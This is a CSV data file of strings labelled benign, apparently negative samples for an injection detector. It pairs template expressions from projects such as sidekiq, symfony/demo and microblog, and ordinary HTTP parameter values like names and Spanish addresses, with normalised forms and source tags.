arce/artzi,arce/artzi,,,0,benign,github:Morzeux/HttpParamsDataset
<%= t('DeleteAll') %>,<%=t('S')%>,,ERB,0,benign,github:sidekiq/sidekiq
carbonell calvet,carbonellcalvet,,,0,benign,github:Morzeux/HttpParamsDataset
{{ 'action.edit_contents'|trans }},{{'S'|trans}},,Twig,0,benign,github:symfony/demo
"<%= script_tag ""javascripts/base-charts.js"" %>","<%=script_tag""S""%>",,ERB,0,benign,github:sidekiq/sidekiq
23599996h,Nh,,,0,benign,github:Morzeux/HttpParamsDataset
6351981280005819,N,,,0,benign,github:Morzeux/HttpParamsDataset
pospalatal,pospalatal,,,0,benign,github:Morzeux/HttpParamsDataset
{{ 'menu.admin'|trans }},{{'S'|trans}},,Twig,0,benign,github:symfony/demo
#{addOwner},#{addowner},,Thymeleaf,0,benign,github:spring-projects/spring-petclinic
{{ item.label(class='form-check-label') }},{{item.label(class='S')}},,Jinja2,0,benign,github:miguelgrinberg/microblog
64556150a,Na,,,0,benign,github:Morzeux/HttpParamsDataset
"<%= ""active"" if d.nil? || d == ""30"" %>","<%=""S""ifd.nil?||d==""S""%>",,ERB,0,benign,github:sidekiq/sidekiq
77077342h,Nh,,,0,benign,github:Morzeux/HttpParamsDataset
<%= t('Failed') %>,<%=t('S')%>,,ERB,0,benign,github:sidekiq/sidekiq
#{previous},#{previous},,Thymeleaf,0,benign,github:spring-projects/spring-petclinic
01237478d,Nd,,,0,benign,github:Morzeux/HttpParamsDataset
sldisk,sldisk,,,0,benign,github:Morzeux/HttpParamsDataset
{{ form.hidden_tag() }},{{form.hidden_tag()}},,Jinja2,0,benign,github:miguelgrinberg/microblog
{{ form_errors(form) }},{{form_errors(form)}},,Twig,0,benign,github:symfony/demo
antulio,antulio,,,0,benign,github:Morzeux/HttpParamsDataset
bisad,bisad,,,0,benign,github:Morzeux/HttpParamsDataset
{{ 'http_error_403.suggestion'|trans }},{{'S'|trans}},,Twig,0,benign,github:symfony/demo
<%= stats.failed %>,<%=stats.failed%>,,ERB,0,benign,github:sidekiq/sidekiq
macedonio,macedonio,,,0,benign,github:Morzeux/HttpParamsDataset
haroun,haroun,,,0,benign,github:Morzeux/HttpParamsDataset
ad5ma.sc9r,adNma.scNr,,,0,benign,github:Morzeux/HttpParamsDataset
to2adora,toNadora,,,0,benign,github:Morzeux/HttpParamsDataset
{{ 'help.login_users'|trans }},{{'S'|trans}},,Twig,0,benign,github:symfony/demo
6344938975904168,N,,,0,benign,github:Morzeux/HttpParamsDataset
${template},${template},,Thymeleaf,0,benign,github:spring-projects/spring-petclinic
francene,francene,,,0,benign,github:Morzeux/HttpParamsDataset
"<%= h truncate(""#{entry['error_class']}: #{entry['error_message']}"", 200) %>","<%=htruncate(""S"",N)%>",,ERB,0,benign,github:sidekiq/sidekiq
"pelayo, 11 12?d","pelayo,NN?d",,,0,benign,github:Morzeux/HttpParamsDataset
asimismo,asimismo,,,0,benign,github:Morzeux/HttpParamsDataset
leo,leo,,,0,benign,github:Morzeux/HttpParamsDataset
{% if is_granted('IS_AUTHENTICATED_FULLY') %},{%ifis_granted('S')%},,Twig,0,benign,github:symfony/demo
0184493259280421,N,,,0,benign,github:Morzeux/HttpParamsDataset
calle nieto 41,callenietoN,,,0,benign,github:Morzeux/HttpParamsDataset
{{ _('Profile') }},{{_('S')}},,Jinja2,0,benign,github:miguelgrinberg/microblog
7a7i86,NaNiN,,,0,benign,github:Morzeux/HttpParamsDataset
disimtrico,disimtrico,,,0,benign,github:Morzeux/HttpParamsDataset
carretera de ribadesella a canero 68 10-g,carreteraderibadesellaacaneroNN-g,,,0,benign,github:Morzeux/HttpParamsDataset
<%= environment_title_prefix %>,<%=environment_title_prefix%>,,ERB,0,benign,github:sidekiq/sidekiq
guillory,guillory,,,0,benign,github:Morzeux/HttpParamsDataset
sanidad,sanidad,,,0,benign,github:Morzeux/HttpParamsDataset
13300,N,,,0,benign,github:Morzeux/HttpParamsDataset
atanaspulos,atanaspulos,,,0,benign,github:Morzeux/HttpParamsDataset
86,N,,,0,benign,github:Morzeux/HttpParamsDataset
3786004753545909,N,,,0,benign,github:Morzeux/HttpParamsDataset
castell de rugat,castellderugat,,,0,benign,github:Morzeux/HttpParamsDataset
c/ gomera 148 3?e,c/gomeraNN?e,,,0,benign,github:Morzeux/HttpParamsDataset
{% if user.about_me %},{%ifuser.about_me%},,Jinja2,0,benign,github:miguelgrinberg/microblog
anhidro,anhidro,,,0,benign,github:Morzeux/HttpParamsDataset
hartzenbusch 98,hartzenbuschN,,,0,benign,github:Morzeux/HttpParamsDataset
ruiloba,ruiloba,,,0,benign,github:Morzeux/HttpParamsDataset
6ilia+ria,Nilia+ria,,,0,benign,github:Morzeux/HttpParamsDataset
5718,N,,,0,benign,github:Morzeux/HttpParamsDataset
4092,N,,,0,benign,github:Morzeux/HttpParamsDataset
<%= t('Delete') %>,<%=t('S')%>,,ERB,0,benign,github:sidekiq/sidekiq
49515,N,,,0,benign,github:Morzeux/HttpParamsDataset
holgorio,holgorio,,,0,benign,github:Morzeux/HttpParamsDataset
#{owners},#{owners},,Thymeleaf,0,benign,github:spring-projects/spring-petclinic
zaquiel,zaquiel,,,0,benign,github:Morzeux/HttpParamsDataset
{{ url_for('main.search') }},{{url_for('S')}},,Jinja2,0,benign,github:miguelgrinberg/microblog
kathrine,kathrine,,,0,benign,github:Morzeux/HttpParamsDataset
{{ next_url }},{{next_url}},,Jinja2,0,benign,github:miguelgrinberg/microblog
drought,drought,,,0,benign,github:Morzeux/HttpParamsDataset
{{ 'help.add_user'|trans }},{{'S'|trans}},,Twig,0,benign,github:symfony/demo
pembrooke_coates@stainless.gd,pembrooke_coates@stainless.gd,,,0,benign,github:Morzeux/HttpParamsDataset
1927,N,,,0,benign,github:Morzeux/HttpParamsDataset
5n37do,NnNdo,,,0,benign,github:Morzeux/HttpParamsDataset
{{ is_active ? 'active' }},{{is_active?'S'}},,Twig,0,benign,github:symfony/demo
{{ post.body }},{{post.body}},,Jinja2,0,benign,github:miguelgrinberg/microblog
"plza. magallanes, 50","plza.magallanes,N",,,0,benign,github:Morzeux/HttpParamsDataset
maria-terzon@lingotes.com.org,maria-terzon@lingotes.com.org,,,0,benign,github:Morzeux/HttpParamsDataset
{% block content %},{%blockcontent%},,Jinja2,0,benign,github:miguelgrinberg/microblog
<%= t('Name') %>,<%=t('S')%>,,ERB,0,benign,github:sidekiq/sidekiq
"avinguda doctor vilaseca, s/n,","avingudadoctorvilaseca,s/n,",,,0,benign,github:Morzeux/HttpParamsDataset
<%= t('MemoryUsage') %>,<%=t('S')%>,,ERB,0,benign,github:sidekiq/sidekiq
smoot,smoot,,,0,benign,github:Morzeux/HttpParamsDataset
t0aspa70ble,tNaspaNble,,,0,benign,github:Morzeux/HttpParamsDataset
ku,ku,,,0,benign,github:Morzeux/HttpParamsDataset
{{ path('security_login') }},{{path('S')}},,Twig,0,benign,github:symfony/demo
7677,N,,,0,benign,github:Morzeux/HttpParamsDataset
"{{ url_for('main.user', username=post.author.username) }}","{{url_for('S',username=post.author.username)}}",,Jinja2,0,benign,github:miguelgrinberg/microblog
arxe matsumiya,arxematsumiya,,,0,benign,github:Morzeux/HttpParamsDataset
pelland,pelland,,,0,benign,github:Morzeux/HttpParamsDataset
milford1,milfordN,,,0,benign,github:Morzeux/HttpParamsDataset
